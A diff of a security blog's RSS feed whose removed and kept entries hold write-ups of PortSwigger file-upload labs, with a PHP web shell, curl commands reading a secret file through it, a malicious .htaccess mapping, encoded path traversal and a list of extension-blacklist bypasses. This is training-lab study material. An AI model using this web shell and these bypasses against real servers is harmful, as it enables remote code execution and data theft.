@@ -4,343 +4,37 @@
     <title>user@cybrealm:~$</title>
     <link>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/</link>
     <description>Recent content on user@cybrealm:~$</description>
-    <generator>Hugo -- gohugo.io</generator>
-      <language>en-us</language>
-      <lastBuildDate>Tue, 16 Jul 2024 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/index.xml" rel="self" type="application/rss+xml" />
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 16 Jul 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>1f4 - Web shell upload via extension blacklist bypass \[PortSwigger Lab]</title>
       <link>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f4-web-shell-upload-via-extension-blacklist-bypass-portswigger-lab/</link>
       <pubDate>Tue, 16 Jul 2024 00:00:00 +0000</pubDate>
-
       <guid>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f4-web-shell-upload-via-extension-blacklist-bypass-portswigger-lab/</guid>
-      <description>&lt;p&gt;This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.&lt;/p&gt;
-&lt;p&gt;To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
-&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Solution:&lt;/p&gt;
-&lt;p&gt;So once again User&amp;rsquo;s page has an avatar upload function which uploads an image at &lt;code&gt;/files/avatars&lt;/code&gt; directory.&lt;/p&gt;</description>
-      <content>&lt;p&gt;This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.&lt;/p&gt;
-&lt;p&gt;To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
-&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Solution:&lt;/p&gt;
-&lt;p&gt;So once again User&amp;rsquo;s page has an avatar upload function which uploads an image at &lt;code&gt;/files/avatars&lt;/code&gt; directory.&lt;/p&gt;
-&lt;p&gt;Uploading &lt;code&gt;mal.php&lt;/code&gt; file gives out an error &lt;code&gt;Sorry, php files are not allowed Sorry, there was an error uploading your file.&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;This means that in the server configuration &lt;code&gt;php&lt;/code&gt; file extension uploads are blocked.&lt;/p&gt;
-&lt;p&gt;trying to upload a &lt;code&gt;mal.php&lt;/code&gt; file shows in Burp Proxy HTTP History that we are talking to an Apache server.  Which means there&amp;rsquo;s a top-level &lt;code&gt;.htaccess&lt;/code&gt; and we can override it with directory-specific one.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34;&gt;
-    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240720184545.png&#34;   /&gt;
-  &lt;/figure&gt;
-
-&lt;p&gt;so what I did was uploaded an &lt;code&gt;.htaccess&lt;/code&gt; file to default location with following contents:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;AddType application/x-httpd-php .hack&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;where we are giving directory permission to execute &lt;code&gt;php&lt;/code&gt; files with an arbitrary extension &lt;code&gt;.hack&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Once uploaded we can call it using cURl and retrieve data.&lt;/p&gt;
-
-&lt;div class=&#34;highlight-wrapper&#34;&gt;
-  &lt;div class=&#34;highlight-toolbar&#34;&gt;
-    &lt;span class=&#34;item&#34;&gt;
-      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
-      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
-    &lt;/span&gt;
-
-
-    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
-  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;curl -X GET &amp;#34;https://0ab9001703efe22d847cce3d003a000a.web-security-academy.net/files/avatars/mal.hack?command=cat%20/home/carlos/secret&amp;#34;
-
-DTFL****************************DTFL****************************&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;The secret: &lt;code&gt;DTFL****************************&lt;/code&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;Bypassing blacklists is also possible using &lt;strong&gt;Obfuscating file extensions&lt;/strong&gt;. For example, if a filename is &lt;code&gt;executable.pHP&lt;/code&gt; and the validation code is case-sensitive, then it won&amp;rsquo;t recognize this as &lt;code&gt;php&lt;/code&gt; and let it bypass the defenses.&lt;/p&gt;
-&lt;p&gt;Similar result can be achieved using the following techniques:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Provide multiple extensions. Depending on how validation happens, it could let in a file like &lt;code&gt;executable.php.jpg&lt;/code&gt;.&lt;/li&gt;
-&lt;li&gt;Add additional trailing character like &lt;code&gt;executable.php.&lt;/code&gt;. some algorithms just ignore or strip trailing characters&lt;/li&gt;
-&lt;li&gt;Use URL encoding for filenames, dots, forward or backward characters. if the value is not checked during validation, the filename will be interpreted server-side.&lt;/li&gt;
-&lt;li&gt;Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: &lt;code&gt;executable.php;.jpg&lt;/code&gt; or &lt;code&gt;executable.php%00.jpg&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like &lt;code&gt;xC0 x2E&lt;/code&gt;, &lt;code&gt;xC4 xAE&lt;/code&gt; or &lt;code&gt;xC0 xAE&lt;/code&gt; may be translated to &lt;code&gt;x2E&lt;/code&gt; if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Some defenses include stripping or replacing dangerous extensions to prevent it from executing. If this doesn&amp;rsquo;t happen recursively, you can place the prohibited extension such a way that after it is removed, valid extension will still be left in place. for example:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;exploit.p.**php**hp&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;striping &lt;code&gt;.php&lt;/code&gt; from this still leaves valid extension behind.&lt;/p&gt;
-</content>
+      <description>&lt;p&gt;This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.&lt;/p&gt;&#xA;&lt;p&gt;To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;&#xA;&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Solution:&lt;/p&gt;&#xA;&lt;p&gt;So once again User&amp;rsquo;s page has an avatar upload function which uploads an image at &lt;code&gt;/files/avatars&lt;/code&gt; directory.&lt;/p&gt;</description>
     </item>
     <item>
       <title>1f3 - Web shell upload via Path Traversal \[PortSwigger Lab]</title>
       <link>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/</link>
       <pubDate>Tue, 09 Jul 2024 00:00:00 +0000</pubDate>
-
       <guid>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/</guid>
-      <description>&lt;p&gt;This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.&lt;/p&gt;
-&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
-&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;solution&#34;&gt;
-  Solution:
-  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;So, User&amp;rsquo;s page includes avatar upload function. just to upload &lt;code&gt;mal.php&lt;/code&gt; with contents &lt;code&gt;&amp;lt;?php echo system($_GET[&#39;command&#39;]); ?&amp;gt;&lt;/code&gt; will just return plaintext version of this script.&lt;/p&gt;</description>
-      <content>&lt;p&gt;This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.&lt;/p&gt;
-&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
-&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;solution&#34;&gt;
-  Solution:
-  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;So, User&amp;rsquo;s page includes avatar upload function. just to upload &lt;code&gt;mal.php&lt;/code&gt; with contents &lt;code&gt;&amp;lt;?php echo system($_GET[&#39;command&#39;]); ?&amp;gt;&lt;/code&gt; will just return plaintext version of this script.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34;&gt;
-    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240720173537.png&#34;   /&gt;
-  &lt;/figure&gt;
-
-&lt;p&gt;it also seems that uploading &lt;code&gt;mal.php&lt;/code&gt; with path traversal &lt;code&gt;../mal.php&lt;/code&gt; still uploads it to &lt;code&gt;files/avatars/mal.php&lt;/code&gt;, which means that it&amp;rsquo;s cutting traversals in path.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34;&gt;
-    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240720173821.png&#34;   /&gt;
-  &lt;/figure&gt;
-
-&lt;p&gt;So all I had to do was obfuscating the path traversal to &lt;code&gt;..%2Fmal.php&lt;/code&gt; which is same as &lt;code&gt;../mal.php&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;after changing a filename to this parameter and uploading it we get the following response&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34;&gt;
-    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/uploaded.png&#34;   /&gt;
-  &lt;/figure&gt;
-
-&lt;p&gt;so the file is uploaded to &lt;code&gt;files/mal.php&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;now we can just call this script using [[1a1b - cURL|cURL]] to get the response&lt;/p&gt;
-
-&lt;div class=&#34;highlight-wrapper&#34;&gt;
-  &lt;div class=&#34;highlight-toolbar&#34;&gt;
-    &lt;span class=&#34;item&#34;&gt;
-      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
-      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
-    &lt;/span&gt;
-
-
-    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
-  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;curl -X GET &amp;#34;https://0a3c00e4049c901c802ee994009d003a.web-security-academy.net/files/mal.php?command=cat%20/home/carlos/secret&amp;#34;
-
-
-jziR****************************jziR****************************&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;The secret: jziR****************************&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;Another obvious way to prevent users from uploading certain files is to blacklist these file extensions like &lt;code&gt;php&lt;/code&gt;. This practice is still flawed since its difficult to explicitly blacklist every file that can be executed. such blacklists can be sometimes bypassed using lesser known, alternative file extensions like &lt;code&gt;.php5&lt;/code&gt; or &lt;code&gt;.shtml&lt;/code&gt; and so on.&lt;/p&gt;
-&lt;p&gt;As previously mentioned, some servers won&amp;rsquo;t let certain files to execute unless they are explicitly configured to do that.&lt;/p&gt;
-&lt;p&gt;As an example, before Apache server lets PHP files to execute, a developer might put something like the following in their &lt;code&gt;/etc/apache2/apache2.conf&lt;/code&gt; file:&lt;/p&gt;
-
-&lt;div class=&#34;highlight-wrapper&#34;&gt;
-  &lt;div class=&#34;highlight-toolbar&#34;&gt;
-    &lt;span class=&#34;item&#34;&gt;
-      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
-      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
-    &lt;/span&gt;
-
-
-    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
-  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;LoadModule php_module /usr/lib/apache2/modules/libphp.so
-	AddType application/x-httpd-php .php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Many servers also allow developers to create special config-files within individual directories to override global configuration parameters. Apache-specific servers for example will load directory-specific configuration from a file called &lt;code&gt;.htaccess&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Similarly, directory-specific configuration can be made on IIS server using &lt;code&gt;web.config&lt;/code&gt; file. This might include directives such as the following, where server only allows JSON files to be served to users:&lt;/p&gt;
-
-&lt;div class=&#34;highlight-wrapper&#34;&gt;
-  &lt;div class=&#34;highlight-toolbar&#34;&gt;
-    &lt;span class=&#34;item&#34;&gt;
-      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
-      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
-    &lt;/span&gt;
-
-
-    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
-  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;staticContent&amp;gt; 
-	&amp;lt;mimeMap fileExtension=&amp;#34;.json&amp;#34; mimeType=&amp;#34;application/json&amp;#34; /&amp;gt; 
-	&amp;lt;/staticContent&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Web servers use these kinds of configuration files when present, but you&amp;rsquo;re not normally allowed to access them using HTTP requests.&lt;/p&gt;
-&lt;p&gt;However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable type.&lt;/p&gt;
-</content>
+      <description>&lt;p&gt;This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;&#xA;&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;solution&#34;&gt;Solution:&lt;/h3&gt;&#xA;&lt;p&gt;So, User&amp;rsquo;s page includes avatar upload function. just to upload &lt;code&gt;mal.php&lt;/code&gt; with contents &lt;code&gt;&amp;lt;?php echo system($_GET[&#39;command&#39;]); ?&amp;gt;&lt;/code&gt; will just return plaintext version of this script.&lt;/p&gt;</description>
     </item>
     <item>
       <title>1f2 - Web shell upload via Content-Type restriction bypass \[Portswigger Lab]</title>
       <link>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/</link>
       <pubDate>Sat, 06 Jul 2024 00:00:00 +0000</pubDate>
-
       <guid>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/</guid>
-      <description>&lt;p&gt;This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.&lt;/p&gt;
-&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
-&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;solution&#34;&gt;
-  Solution:
-  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;So upon logging in my account, I can see the avatar upload field.&lt;/p&gt;</description>
-      <content>&lt;p&gt;This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.&lt;/p&gt;
-&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
-&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;solution&#34;&gt;
-  Solution:
-  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;So upon logging in my account, I can see the avatar upload field.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34;&gt;
-    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719144326.png&#34;   /&gt;
-  &lt;/figure&gt;
-
-&lt;p&gt;Testing this functionality by uploading an empty &lt;code&gt;test.txt&lt;/code&gt; file gives me an error&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;Sorry, file type text/plain is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;The next thing I tried was to upload the same file but modify the HTTP request using burpsuite and change &lt;code&gt;Content-Type: Text/Plain&lt;/code&gt; to &lt;code&gt;Content-Type: image/jpeg&lt;/code&gt;. This bypassed a defense mechanism and as a result it let me upload a text file&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34;&gt;
-    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719145007.png&#34;   /&gt;
-  &lt;/figure&gt;
-
-&lt;p&gt;Now it&amp;rsquo;s time to upload a web shell &lt;code&gt;mal.php&lt;/code&gt; with the following contents:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;&amp;lt;?php echo system($_GET[&#39;command&#39;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34;&gt;
-    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719145330.png&#34;   /&gt;
-  &lt;/figure&gt;
-
-&lt;p&gt;Now, since I know that this &lt;code&gt;mal.php&lt;/code&gt; is uploaded in &lt;code&gt;/files/avatars/mal.php&lt;/code&gt;, I can call it using CURL.&lt;/p&gt;
-&lt;p&gt;And we got the secret&lt;/p&gt;
-
-&lt;div class=&#34;highlight-wrapper&#34;&gt;
-  &lt;div class=&#34;highlight-toolbar&#34;&gt;
-    &lt;span class=&#34;item&#34;&gt;
-      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
-      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
-    &lt;/span&gt;
-
-
-    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
-  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;curl -X GET &amp;#34;https://0a2200b703596e51800635e70004004c.web-security-academy.net/files/avatars/mal.php?command=cat%20../../../../home/carlos/secret&amp;#34;
-
-7nJBS****************************7nJBS****************************&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;remember that calls form curl like this repeats the response twice, so I had to remove the double of this output.&lt;/p&gt;
-&lt;p&gt;The secret contents: &lt;code&gt;7nJB****************************&lt;/code&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;&lt;strong&gt;Impact of FUVs generally depend on two key factors&lt;/strong&gt;:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Which aspect of the file the website fails to validate properly, whether its the size, type, contents&amp;hellip;&lt;/li&gt;
-&lt;li&gt;what restrictions are imposed once file is uploaded&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;In the worst case scenario, the file is not validated at all and the server configuration allows certain types to run as code - potentially giving an attacker web shell and full access to a webserver.&lt;/p&gt;
-&lt;p&gt;In case filename isn&amp;rsquo;t validated properly, an attacker might just replace original file with a malicious one.&lt;/p&gt;
-&lt;p&gt;Failing to validate file size might also enable an attacker to perform a DoS.&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;How Web servers handle static file requests?&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;Generally, static files on a website can be mapped 1:1 with a filesystem hierarchy.&lt;/p&gt;
-&lt;p&gt;Nowadays modern applications are dynamic and hence complex. Path of a request may not necessarily represent a filesystem entirely. Nowadays, web servers still deal with static requests for some static files like stylesheets, images etc.&lt;/p&gt;
-&lt;p&gt;The process for handling such files is historically largely the same. - The server parses the path in the request to identify the file extension. Then uses this information to determine the filetype by comparing it to preconfigured mapping between extensions and MIME types.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;if the file is non-executable like HTML file, it may just send the file in the HTTP response&lt;/li&gt;
-&lt;li&gt;if the file is executable like PHP or PYTHON and the server is configured to execute these files, it will assign variables based on the headers and parameters in the HTTP request before executing it. The result may be passed on to HTTP response after.&lt;/li&gt;
-&lt;li&gt;if the file is executable, but the server is not configured to run them, it will generally respond with an error or in some cases, just send back the plain text representation of the code to the client. such misconfigurations may lead to code and sensitive data leakage. The &lt;code&gt;Content-Type&lt;/code&gt; response header may provide clues as to what kind of file the server thinks it has served.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;As a precaution, servers generally only run scripts whose filetypes have been explicitly defined to execute. Otherwise they may return an error message or plaintext of source code. In such cases, it might only be possible to leak the source but won&amp;rsquo;t be able to deploy a webshell.&lt;/p&gt;
-&lt;p&gt;This kind of configuration will have a strict policy for directories where user can upload files than other locations on the filesystem that are assumed to be out of reach from users. If you can find a directory where user-uploaded files are not supposed to be, the code might execute.&lt;/p&gt;
-&lt;p&gt;Web servers often use the &lt;code&gt;filename&lt;/code&gt; field in &lt;code&gt;multipart/form-data&lt;/code&gt; requests to determine the name and location where the file should be saved.&lt;/p&gt;
-</content>
+      <description>&lt;p&gt;This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.&lt;/p&gt;&#xA;&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;&#xA;&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;solution&#34;&gt;Solution:&lt;/h3&gt;&#xA;&lt;p&gt;So upon logging in my account, I can see the avatar upload field.&lt;/p&gt;</description>
     </item>
     <item>
       <title></title>
       <link>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f1-remote-code-execution-via-web-shell-upload-portswigger-lab/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-
       <guid>http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f1-remote-code-execution-via-web-shell-upload-portswigger-lab/</guid>
-      <description>&lt;h1 id=&#34;1f1---remote-code-execution-via-web-shell-upload-portswigger-lab&#34;&gt;
-  1f1 - Remote code execution via web shell upload [PortSwigger Lab]
-  &lt;a href=&#34;#1f1---remote-code-execution-via-web-shell-upload-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
-&lt;/h1&gt;
-&lt;p&gt;This lab contains a vulnerable image upload function. It doesn&amp;rsquo;t perform any validation on the files users upload before storing them on the server&amp;rsquo;s filesystem.&lt;/p&gt;
-&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
-&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;</description>
-      <content>
-&lt;h1 id=&#34;1f1---remote-code-execution-via-web-shell-upload-portswigger-lab&#34;&gt;
-  1f1 - Remote code execution via web shell upload [PortSwigger Lab]
-  &lt;a href=&#34;#1f1---remote-code-execution-via-web-shell-upload-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
-&lt;/h1&gt;
-&lt;p&gt;This lab contains a vulnerable image upload function. It doesn&amp;rsquo;t perform any validation on the files users upload before storing them on the server&amp;rsquo;s filesystem.&lt;/p&gt;
-&lt;p&gt;To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file &lt;code&gt;/home/carlos/secret&lt;/code&gt;. Submit this secret.&lt;/p&gt;
-&lt;p&gt;You can log in to your own account using the following credentials: &lt;code&gt;wiener:peter&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;solution&#34;&gt;
-  &lt;strong&gt;Solution:&lt;/strong&gt;
-  &lt;a href=&#34;#solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;So this application has an unprotected upload field in user page where you can upload profile avatar.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34;&gt;
-    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020240719131804.png&#34;   /&gt;
-  &lt;/figure&gt;
-
-&lt;p&gt;From there, I effectively uploaded a file named &lt;code&gt;mal.php&lt;/code&gt; with contents &lt;code&gt;&amp;lt;?php echo system($_GET[&#39;command&#39;]); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;once upload was done, I had to know where the file was uploaded so I could call it. Inspecting avatar link gave me the clue. &lt;code&gt;&amp;lt;img src=&amp;quot;/files/avatars/mal.php&amp;quot; class=&amp;quot;avatar&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;so I opened up terminal and called the &lt;code&gt;mal.php&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&#34;highlight-wrapper&#34;&gt;
-  &lt;div class=&#34;highlight-toolbar&#34;&gt;
-    &lt;span class=&#34;item&#34;&gt;
-      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
-      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
-    &lt;/span&gt;
-
-
-    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
-  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$&amp;gt; curl -X GET &amp;#34;https://0a9000000490ee47800ead51001f0062.web-security-academy.net/files/avatars/mal.php?command=pwd&amp;#34;
-
-/var/www/html/avatars
-/var/www/html/avatars&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Now I know I&amp;rsquo;m at &lt;code&gt;/var/www/html/avatars&lt;/code&gt;. So to read the contents of the &lt;code&gt;secrets&lt;/code&gt; file, all I have to do is a simple [[2 - Portswigger Academy#Path Traversal |Path Traversal]]&lt;/p&gt;
-
-&lt;div class=&#34;highlight-wrapper&#34;&gt;
-  &lt;div class=&#34;highlight-toolbar&#34;&gt;
-    &lt;span class=&#34;item&#34;&gt;
-      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
-      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
-    &lt;/span&gt;
-
-
-    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
-  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$&amp;gt; curl -X GET &amp;#34;https://0a9000000490ee47800ead51001f0062.web-security-academy.net/files/avatars/mal.php?command=cat%20../../../../home/carlos/secret&amp;#34;
-
-U4AE****************************U4AE****************************&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Keep in mind this method repeats the message twice, so I had to remove the second part of message.&lt;/p&gt;
-&lt;p&gt;The &lt;code&gt;secret&lt;/code&gt; contents:&lt;code&gt;`U4AE****************************&#39;&lt;/code&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;Most of the times, FOV will not be this easy. There will be defense mechanisms in place, but it doesn&amp;rsquo;t mean they are robust. They can still be exploited by finding flaws in these defense mechanisms.&lt;/p&gt;
-&lt;ol&gt;
